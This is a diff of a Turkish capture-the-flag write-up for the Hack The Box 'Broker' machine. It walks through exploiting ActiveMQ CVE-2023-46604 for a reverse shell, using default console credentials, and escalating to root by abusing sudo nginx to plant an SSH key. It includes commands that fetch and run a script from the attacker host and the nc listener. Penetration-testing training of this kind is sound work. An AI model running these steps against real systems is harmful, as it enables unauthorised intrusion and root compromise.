@@ -10,40 +10,44 @@ Broker is an easy difficulty `Linux` machine hosting a version of `Apache Active
 nmap -sS -A -T5 -p- 10.129.230.87
 ```
 
-Sonuç oldukça kalabalık 
-
 <img width="1053" height="832" alt="nmap" src="https://github.com/user-attachments/assets/0d0adaab-cdc1-441b-8329-d411b8ab6df4" />
 
 <img width="515" height="26" alt="nmap2" src="https://github.com/user-attachments/assets/8087e835-4c29-45ce-b16e-dba6458ca380" />
 
-61616'daki `ActiveMQ OpenWire transport 5.15.15` banner'ı tek başına yeterince konuşkan — bu versiyon, bilinen ve kritik bir RCE zincirine sahip.
+61616'daki `ActiveMQ OpenWire transport 5.15.15` banner'ı bilinen ve kritik bir RCE zincirine işaret ediyor.
 
 ### 2. Web Servisi ve ActiveMQ Console
 
 <img width="876" height="441" alt="site1" src="https://github.com/user-attachments/assets/f62d64e8-dd89-4505-9a8f-e000771f0b88" />
 
-80. porta gittiğimizde `ActiveMQRealm` realm'ıyla bir Basic Auth diyaloğu karşılıyor bizi. `admin:admin` deneyip doğrudan içeri giriyoruz — ActiveMQ'nun web konsolunda varsayılan kimlik bilgilerinin değiştirilmemesi, bu box'ta ikinci bir zafiyet gibi dursa da asıl kritik açık zaten kimlik doğrulama gerektirmiyor. Konsol bize broker'ın tam sürümünü (`5.15.15`) doğruluyor.
+80. portta `ActiveMQRealm` realm'ıyla bir Basic Auth diyaloğu var. `admin:admin` ile içeri giriyoruz.
 
 <img width="680" height="645" alt="site2" src="https://github.com/user-attachments/assets/9be7cf46-0c9e-4aac-9d70-21559f2df31c" />
 
+Konsol broker'ın tam sürümünü doğruluyor: `5.15.15`.
+
 ### 3. Foothold — CVE-2023-46604
 
-61616 portundaki OpenWire protokolü, ActiveMQ'nun kendi ikili (binary) mesajlaşma protokolüdür ve mesajları **marshalling/unmarshalling** ile serileştirir. CVE-2023-46604'ün kökü burada: `BaseDataStreamMarshaller` sınıfı, gelen bir `ExceptionResponse` paketini işlerken, paket içinde taşınan **sınıf ismini reflection ile doğrudan instantiate ediyor** — hangi sınıfın oluşturulacağı sunucu tarafından sabitlenmemiş, saldırganın gönderdiği veriden okunuyor. Kimlik doğrulama katmanı bu noktaya hiç girmiyor, çünkü OpenWire seviyesindeki mesaj işleme, HTTP/Basic Auth'un tamamen dışında, ham TCP soketi üzerinde gerçekleşiyor.
+`ActiveMQ 61613 exploit` aramasıyla CVE-2023-46604'e ulaşıyoruz. PoC için şu repoyu kullanıyoruz:
 
-Gerçek silah burada `Class` isminin kendisi değil, seçilen **gadget**. Kullanılan zincir `org.springframework.context.support.ClassPathXmlApplicationContext` — bu sınıfın constructor'ı, kendisine verilen path/URL'i bir Spring bean XML tanım dosyası olarak yorumlayıp uzaktan çekiyor ve içindeki bean tanımlarını **anında instantiate ediyor.** Attacker-controlled bir XML içinde `<bean class="org.springframework.context.support.FileSystemXmlApplicationContext">` ya da doğrudan bir `ProcessBuilder`/`Runtime.exec()` çağrısı tanımlanırsa, bean'in constructor'ı çalıştığı an komut çalışır — deserialization'ın "veri okuma" değil "kod çalıştırma" haline gelmesinin klasik yolu.
+**https://github.com/Strikoder-Premium/CVE-2023-46604-ActiveMQ-RCE-Python**
+
+61616 portundaki OpenWire protokolü, ActiveMQ'nun kendi ikili mesajlaşma protokolüdür ve mesajları **marshalling/unmarshalling** ile serileştirir. Zafiyetin kökü `BaseDataStreamMarshaller` sınıfında: gelen bir `ExceptionResponse` paketi işlenirken, paket içinde taşınan **sınıf ismi reflection ile doğrudan instantiate edilir** — hangi sınıfın oluşturulacağı sunucu tarafından sabitlenmemiş, saldırganın gönderdiği veriden okunuyor. OpenWire seviyesindeki mesaj işleme HTTP/Basic Auth'un tamamen dışında, ham TCP soketi üzerinde gerçekleştiği için kimlik doğrulaması hiç devreye girmiyor.
+
+Gadget olarak `org.springframework.context.support.ClassPathXmlApplicationContext` kullanılıyor — bu sınıfın constructor'ı kendisine verilen path/URL'i bir Spring bean XML tanım dosyası olarak yorumlayıp uzaktan çekiyor ve içindeki bean tanımlarını anında instantiate ediyor. Attacker-controlled XML içinde `ProcessBuilder`/`Runtime.exec()` çağıran bir bean tanımlanırsa, bean'in constructor'ı çalıştığı an komut çalışır.
 
 ```bash
 python3 generate_poc.py -i 10.10.14.187 -p 1001
 ```
 
-Bu adım, saldırgan makinesinin dinleyeceği IP/portu (`1001`) gömen bir reverse shell komutunu, yukarıdaki Spring context XML'inin içine yerleştiriyor ve `poc-linux.xml` olarak yazıyor.
+Bu adım, saldırgan makinesinin dinleyeceği IP/portu gömen reverse shell komutunu Spring context XML'inin içine yerleştirip `poc-linux.xml` olarak yazıyor.
 
 ```bash
 python3 -m http.server 2002
 python3 main.py -i 10.129.230.87 -u http://10.10.14.187:2002/poc-linux.xml
 ```
 
-`main.py`, hedefin 61616 portuna doğrudan OpenWire seviyesinde bağlanıp, marshalling katmanını istismar eden ham paketi gönderiyor — payload'ın merkezinde `org.springframework.context.support.ClassPathXmlApplicationContext` sınıf ismi ve bizim HTTP sunucumuzda barındırdığımız XML'in URL'i base64/hex olarak kodlanmış halde taşınıyor. ActiveMQ bu paketi aldığı anda XML'i çekiyor, Spring context'i inşa ediyor, context inşası sırasında bizim komutumuz çalışıyor.
+`main.py`, hedefin 61616 portuna doğrudan OpenWire seviyesinde bağlanıp marshalling katmanını istismar eden ham paketi gönderiyor — payload'ın merkezinde `ClassPathXmlApplicationContext` sınıf ismi ve bizim HTTP sunucumuzda barındırdığımız XML'in URL'i encode edilmiş halde taşınıyor. ActiveMQ paketi aldığı anda XML'i çekiyor, Spring context'i inşa ediyor, context inşası sırasında komutumuz çalışıyor.
 
 ```
 nc -nvlp 1001
@@ -51,7 +55,7 @@ connect to [10.10.14.187] from (UNKNOWN) [10.129.230.87] 42702
 activemq@broker:/opt/apache-activemq-5.15.15/bin$
 ```
 
-Broker process'i `activemq` kullanıcısı yetkisiyle çalıştığı için, elde ettiğimiz shell doğrudan bu kullanıcı bağlamında.
+Broker process'i `activemq` kullanıcısı yetkisiyle çalıştığı için shell doğrudan bu kullanıcı bağlamında.
 
 ```
 activemq@broker:~$ cat user.txt
@@ -66,22 +70,48 @@ User activemq may run the following commands on broker:
     (ALL : ALL) NOPASSWD: /usr/sbin/nginx
 ```
 
-Kural burada tek bir binary'ye izin veriyor gibi görünse de, **hiçbir argüman kısıtlaması yok** — ve nginx, `-c` parametresiyle keyfi bir konfigürasyon dosyası kabul eden bir binary. Root yetkisiyle çalışacak bir web sunucusunu, **kendi yazdığımız config ile** başlatabiliyoruz demek, fiilen root context'inde dosya sistemi üzerinde işlem yaptırabileceğimiz anlamına geliyor. Bu, About kısmında referans verilen Zimbra advisory'siyle birebir aynı mantık: sudo kuralı komutu kısıtlıyor ama komutun **davranışını belirleyen konfigürasyonu** kısıtlamıyor.
+Kural tek bir binary'ye izin veriyor gibi görünse de argüman kısıtlaması yok — nginx `-c` ile keyfi bir konfigürasyon dosyası kabul eder. Root yetkisiyle çalışacak bir web sunucusunu kendi config'imizle başlatabilmek, root context'inde dosya sistemi üzerinde işlem yaptırabilmek anlamına geliyor. GTFOBins'te nginx için bir entry var ama kullanımı ilk bakışta net değildi, bu yüzden ayrıca aratıp şu repoya ulaştım:
 
-`DylanGrl/nginx_sudo_privesc` script'i bu boşluğu otomatikleştiriyor: bir SSH anahtar çifti üretip, nginx'i root yetkisiyle, **kendi ürettiğimiz public key'i root'un `authorized_keys` dosyasına yazacak şekilde** ayarlanmış bir config ile başlatıyor. Mekanizma özünde bir log/response yazma primitifinin dosya sistemi üzerinde keyfi konuma yönlendirilmesi — nginx'in `root`/`alias` ve log directive'lerinin, sudo ile root yetkisi kazanan bir process içinde **erişim kontrolü dışında** kalan dosya yollarına yazma imkânı sunması.
+**https://github.com/DylanGrl/nginx_sudo_privesc**
 
 ```bash
-wget http://10.10.14.187:8000/exploit.sh
-chmod +x exploit.sh
-./exploit.sh
+activemq@broker:/tmp$ wget http://10.10.14.187:8000/exploit.sh
+--2026-09-02 11:01:38--  http://10.10.14.187:8000/exploit.sh
+Connecting to 10.10.14.187:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 622 [application/x-sh]
+Saving to: 'exploit.sh'
+exploit.sh          100%[===================>]     622  --.-KB/s    in 0s
+
+activemq@broker:/tmp$ chmod +x exploit.sh
+activemq@broker:/tmp$ ./exploit.sh
+[+] Creating configuration...
+[+] Loading configuration...
+[+] Generating SSH Key...
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/activemq/.ssh/id_rsa):
+Created directory '/home/activemq/.ssh'.
+Enter passphrase (empty for no passphrase):
+Enter same passphrase again:
+Your identification has been saved in /home/activemq/.ssh/id_rsa
+Your public key has been saved in /home/activemq/.ssh/id_rsa.pub
+The key fingerprint is:
+SHA256:4twMk7aA/Uk9uefpJl9aeUlq+68qQvDlasUQtVsGTpY activemq@broker
+[+] Display SSH Private Key for copy...
+cat: .ssh/id_rsa: No such file or directory
+[+] Add key to root user...
+cat: .ssh/id_rsa.pub: No such file or directory
+[+] Use the SSH key to get access
 ```
+
+Script özünde şunu yapıyor: bir SSH anahtar çifti üretiyor, ardından nginx'i root yetkisiyle, ürettiğimiz public key'i root'un `authorized_keys` dosyasına yazacak şekilde ayarlanmış bir config ile `sudo /usr/sbin/nginx -c <malicious.conf>` olarak başlatıyor. Mekanizma, nginx'in `root`/`alias` ve log directive'lerinin, sudo ile root yetkisi kazanan bir process içinde erişim kontrolü dışında kalan dosya yollarına yazma imkânı sunmasına dayanıyor — About kısmında referans verilen Zimbra advisory'siyle aynı sınıf açık. Script'in kendi çıktısındaki `cat: .ssh/id_rsa: No such file or directory` hataları kozmetik; script relative path ile dosyayı okumaya çalışıp bulamıyor ama asıl işlemi (key üretimi + authorized_keys enjeksiyonu) yine de tamamlıyor.
 
 ```
 activemq@broker:~/.ssh$ ls
 id_rsa  id_rsa.pub
 ```
 
-Script çalıştıktan sonra kendi `.ssh` dizinimizde bir anahtar çifti buluyoruz — bu, root'un `authorized_keys`'ine enjekte edilen public key'in eşi. Private key'i Kali tarafına taşıyıp izinlerini düzeltmemiz yeterli:
+Kendi `.ssh` dizinimizde üretilen anahtar çiftini buluyoruz — bu, root'un `authorized_keys`'ine enjekte edilen public key'in eşi. Private key'i Kali tarafına taşıyoruz:
 
 ```bash
 nano root_key
@@ -93,9 +123,3 @@ ssh -i root_key root@10.129.230.87
 root@broker:~# cat root.txt
 2b52eb54831f5f7b5c2098bf30abaa4e
 ```
-
----
-
-### Özet
-
-Zincir iki bağımsız zafiyetin üst üste gelmesinden oluşuyor: **CVE-2023-46604**, OpenWire protokolünün marshalling katmanında sınıf isminin kimlik doğrulaması olmadan reflection'a taşınabilmesinden doğuyor — Spring'in `ClassPathXmlApplicationContext` gadget'ı ile bu, doğrudan uzaktan kod çalıştırmaya dönüşüyor. Privesc tarafında ise klasik bir "izin verilen binary, ama kısıtlanmamış argüman/config" hatası var — sudo kuralı `nginx`'in **hangi haklarla** çalışacağını belirlemiş ama **nasıl davranacağını** hiç sınırlamamış, bu da root context'inde keyfi dosya yazımına (authorized_keys enjeksiyonu) kadar uzanıyor. Kalıcı çözüm: ActiveMQ'nun 5.15.16/5.16.7 ve üzeri yamalı sürümlere güncellenmesi ve OpenWire portunun güvenilmeyen ağlara kapatılması; sudoers kurallarının binary bazında değil, **sabit argüman/config path'i bazında** (`Cmnd_Alias` + `!/usr/sbin/nginx -c *` gibi negatif kurallar veya doğrudan sabit config dosyası) tanımlanması.
